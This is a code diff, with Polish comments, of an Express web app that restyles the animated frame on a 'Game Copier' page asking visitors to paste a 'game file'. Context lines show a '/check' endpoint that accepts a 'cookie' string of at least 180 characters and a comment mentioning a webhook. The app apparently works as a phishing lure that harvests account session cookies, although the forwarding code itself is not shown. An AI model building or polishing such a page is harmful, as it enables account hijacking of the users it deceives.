@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna
+// Strona główna – bez zmian
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -64,7 +64,9 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – szaro-biała, animowana ramka, nowy placeholder
+// ────────────────────────────────────────────────
+// Podstrona /game-copier – animowana orbita wokół pola tekstowego
+// ────────────────────────────────────────────────
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -113,41 +115,46 @@ app.get('/game-copier', (req, res) => {
       letter-spacing: -0.4px;
       text-align: center;
     }
-    /* Animowana ramka wokół pola tekstowego */
-    .glowing-border {
+    /* Animowana orbita / smuga wokół pola tekstowego */
+    .orbit-frame {
       position: relative;
-      background: #ffffff;
+      width: 100%;
       border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.07);
-      padding: 3px;
+      overflow: visible;
+      padding: 4px;
+      margin-bottom: 28px;
     }
-    .glowing-border::before {
+    .orbit-frame::before,
+    .orbit-frame::after {
       content: '';
       position: absolute;
-      inset: -4px;
-      background: linear-gradient(45deg, #000000, #444444, #888888, #444444, #000000);
-      background-size: 300% 300%;
-      animation: glowBorder 7s ease infinite;
-      border-radius: 20px;
-      filter: blur(8px);
-      opacity: 0.85;
-      z-index: -1;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      border-radius: 18px;
+      pointer-events: none;
     }
-    .glowing-border::after {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: #ffffff;
-      border-radius: 13px;
-      z-index: -1;
+    .orbit-frame::before {
+      background: linear-gradient(90deg, transparent 30%, rgba(0,0,0,0.9) 50%, transparent 70%);
+      animation: orbitMove 5s linear infinite;
+      filter: blur(6px);
+      opacity: 0.7;
+    }
+    .orbit-frame::after {
+      background: linear-gradient(90deg, transparent 40%, rgba(0,0,0,0.6) 50%, transparent 60%);
+      animation: orbitMove 5s linear infinite reverse;
+      filter: blur(10px);
+      opacity: 0.5;
     }
     .inner-box {
-      background: #ffffff;
-      border-radius: 13px;
+      background: white;
+      border-radius: 14px;
       padding: 18px 20px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.06);
       position: relative;
-      z-index: 1;
+      z-index: 2;
     }
     textarea {
       width: 100%;
@@ -155,7 +162,7 @@ app.get('/game-copier', (req, res) => {
       background: transparent;
       border: none;
       outline: none;
-      resize: vertical;
+      resize: none;           /* ← usunięto możliwość rozwijania */
       font-family: Consolas, "Courier New", monospace;
       font-size: 14.5px;
       color: #111111;
@@ -204,10 +211,9 @@ app.get('/game-copier', (req, res) => {
       border: none;
     }
 
-    @keyframes glowBorder {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+    @keyframes orbitMove {
+      0%   { transform: translateX(-100%) rotate(0deg); }
+      100% { transform: translateX(100%) rotate(360deg); }
     }
   </style>
 </head>
@@ -218,7 +224,7 @@ app.get('/game-copier', (req, res) => {
   <div class="container">
     <div class="left">
       <h1>Game Copier</h1>
-      <div class="glowing-border">
+      <div class="orbit-frame">
         <div class="inner-box">
           <textarea id="input" placeholder="Paste Your Game File There"></textarea>
         </div>
@@ -240,7 +246,7 @@ app.get('/game-copier', (req, res) => {
   </div>
 
 <script>
-// Animowane kropki w tle
+// kropki w tle (bez zmian)
 const canvas = document.getElementById('bgCanvas');
 const ctx = canvas.getContext('2d');
 
@@ -303,7 +309,7 @@ function animate() {
 }
 animate();
 
-// Logika przycisku
+// logika przycisku – bez zmian
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
@@ -357,7 +363,7 @@ async function start() {
   `);
 });
 
-// Endpoint /check – bez zmian
+// endpoint /check – bez zmian (cała logika + webhook)
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
